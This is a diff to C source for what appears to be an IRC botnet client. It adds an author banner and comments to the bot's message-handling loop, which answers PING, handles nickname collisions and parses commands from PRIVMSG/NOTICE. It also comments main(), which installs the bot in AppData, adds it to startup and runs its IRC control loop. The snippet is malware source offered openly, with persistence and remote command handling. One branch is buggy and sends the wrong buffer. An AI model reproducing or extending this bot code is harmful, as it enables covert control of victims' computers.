@@ -1,3 +1,13 @@
+/*
+
+made by augboi incorporated
+established 2002
+based out of hoboken NJ
+
+shoot me an email! augustgl@protonmail.ch
+
+*/
+
 #define _CRT_SECURE_NO_WARNINGS
 
 #include "config.h"
@@ -408,22 +418,22 @@ top:
 
 		else {
 			printf("[+] received buffer: %s\r\n", buffer);
-
-			if (strstr(buffer, "PING :")) {
+ 
+			if (strstr(buffer, "PING :")) { // check for PING
 				ptr = strstr(buffer, "PING :") + strlen("PING :");
-				sprintf(msg, "PONG :%s\n", ptr);
+				sprintf(msg, "PONG :%s\n", ptr); // send PONG
 				send(maincommsock, msg, strlen(msg), 0);
 			}
-			else if (strstr(buffer, "433"))
+			else if (strstr(buffer, "433")) // no fucking clue
 			{
 				sprintf(buffer, "NICK %s\n", rndx(8));
 				send(maincommsock, msg, strlen(msg), 0);
 			}
 
 
-			else if (strstr(buffer, "PRIVMSG") || strstr(buffer, "NOTICE"))
+			else if (strstr(buffer, "PRIVMSG") || strstr(buffer, "NOTICE")) // PRIVMSG, meaning someone just sent a cmd
 			{
-				Parse(buffer);
+				Parse(buffer); // parse
 			}
 
 		}
@@ -436,8 +446,8 @@ top:
 }
 
 int main(int argc, char** argv[]) {
-	install();
-	startup();
-	ircmain();
+	install(); // install bot (in appdata)
+	startup(); // add to startup
+	ircmain(); // main IRC Function
 
 }
